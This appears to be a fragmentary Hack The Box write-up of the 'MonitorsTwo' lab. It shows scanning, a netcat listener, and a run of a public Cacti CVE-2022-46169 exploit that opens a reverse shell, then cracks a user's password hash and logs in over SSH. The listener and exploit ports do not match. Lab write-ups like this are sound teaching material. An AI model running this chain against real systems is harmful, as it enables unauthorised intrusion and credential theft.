...
{{< img src="/img/hack-the-box-monitorstwo-write-up/hack-the-box-monitorstwo-write-up-01.png" >}}
...
```console
┌──(elohim㉿kali)-[~/Desktop/ROOMS/HTB/Pilgrimage]└─$ export ip=10.10.11.211
```
...
```console
┌──(elohim㉿kali)-[~]└─$ ping -c 3 $ip    PING 10.10.11.211 (10.10.11.211) 56(84) bytes of data.64 bytes from 10.10.11.211: icmp_seq=1 ttl=63 time=159 ms64 bytes from 10.10.11.211: icmp_seq=2 ttl=63 time=92.6 ms64 bytes from 10.10.11.211: icmp_seq=3 ttl=63 time=90.4 ms--- 10.10.11.211 ping statistics ---3 packets transmitted, 3 received, 0% packet loss, time 2003msrtt min/avg/max/mdev = 90.399/113.950/158.887/31.787 ms
```
...
```console
┌──(elohim㉿kali)-[~]└─$ nmap -T5 -A -sV $ip     Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-13 03:36 EDTWarning: 10.10.11.211 giving up on port because retransmission cap hit (2).Nmap scan report for 10.10.11.211Host is up (0.13s latency).Not shown: 906 closed tcp ports (conn-refused), 92 filtered tcp ports (no-response)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-title: Login to Cacti|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 30.33 seconds
```
...
{{< img src="/img/hack-the-box-monitorstwo-write-up/hack-the-box-monitorstwo-write-up-02.png" >}}
...
```console
┌──(elohim㉿kali)-[~]└─$ nc -lnvp 1700 listening on [any] 1700 ...
```

Then we run the exploit:

```console
┌──(elohim㉿kali)-[~/…/ROOMS/HTB/MonitorsTwo/CVE-2022-46169-CACTI-1.2.22]└─$ python3 CVE-2022-46169.py -u http://10.10.11.211/ --LHOST=10.10.16.7 --LPORT=1711
```
...
{{< img src="/img/hack-the-box-monitorstwo-write-up/hack-the-box-monitorstwo-write-up-03.png" >}}

## |=---[ Initial Access ]

On the ***/* **directory we found a file named** *entrypoint.sh :***

{{< img src="/img/hack-the-box-monitorstwo-write-up/hack-the-box-monitorstwo-write-up-04.png" >}}
...
{{< img src="/img/hack-the-box-monitorstwo-write-up/hack-the-box-monitorstwo-write-up-05.png" >}}

This is a hash for some user named marcus. Let’s put it in a file and try to crack it:

```console
┌──(elohim㉿kali)-[~/Desktop/ROOMS/HTB/MonitorsTwo]└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  
```

It worked!

{{< img src="/img/hack-the-box-monitorstwo-write-up/hack-the-box-monitorstwo-write-up-06.png" >}}

Remember the SSH port? Let’s give it a try:

```console
┌──(elohim㉿kali)-[~/Desktop/ROOMS/HTB/MonitorsTwo]└─$ ssh marcus@10.10.11.211  
```

Great!

{{< img src="/img/hack-the-box-monitorstwo-write-up/hack-the-box-monitorstwo-write-up-07.png" >}}

## |=---[ Privilege Escalation ]

On the ***monitorstwo*** machine, a vulnerable version of docker is installed:

{{< img src="/img/hack-the-box-monitorstwo-write-up/hack-the-box-monitorstwo-write-up-08.png" >}}
...
{{< img src="/img/hack-the-box-monitorstwo-write-up/hack-the-box-monitorstwo-write-up-09.png" >}}
...
{{< img src="/img/hack-the-box-monitorstwo-write-up/hack-the-box-monitorstwo-write-up-10.png" >}}
...
{{< img src="/img/hack-the-box-monitorstwo-write-up/hack-the-box-monitorstwo-write-up-11.png" >}}
...
{{< img src="/img/hack-the-box-monitorstwo-write-up/hack-the-box-monitorstwo-write-up-12.png" >}}
...
{{< img src="/img/hack-the-box-monitorstwo-write-up/hack-the-box-monitorstwo-write-up-13.png" >}}

Root flag:

{{< img src="/img/hack-the-box-monitorstwo-write-up/hack-the-box-monitorstwo-write-up-14.png" >}}
